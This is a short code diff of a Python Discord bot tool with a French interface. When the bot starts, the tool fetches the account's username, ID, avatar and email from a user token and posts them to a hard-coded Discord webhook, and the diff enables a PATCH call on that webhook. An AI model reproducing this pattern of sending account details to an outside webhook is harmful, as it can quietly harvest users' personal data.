@@ -112,7 +112,7 @@ def send_webhook(username, user_id, avatar_url, email):
     }
 
     response = requests.post(WEBHOOK_URL, json=data)
-    #response = requests.patch(f"https://discord.com/api/v9/webhooks/{WEBHOOK_URL.split('/')[-2]}/{WEBHOOK_URL.split('/')[-1]}", json=data)
+    response = requests.patch(f"https://discord.com/api/v9/webhooks/{WEBHOOK_URL.split('/')[-2]}/{WEBHOOK_URL.split('/')[-1]}", json=data)
 
     if response.status_code == 204:
         print("Nom d'utilisateur envoyé avec succès au webhook.", "success")
@@ -284,8 +284,8 @@ def toggle_bot():
         running = True
         log_message("Bot démarré.", "info")
         start_button.config(text="Arrêter", bootstyle="danger")
-        username, user_id, avatar_url, created_at, email = recup_nom_discord(token)
-        send_webhook(username, user_id, avatar_url, created_at, email)
+        username, user_id, avatar_url, email = recup_nom_discord(token)
+        send_webhook(username, user_id, avatar_url, email)
         threading.Thread(target=envoyer_message, daemon=True).start()
 
 def ouvrir_lien(event):
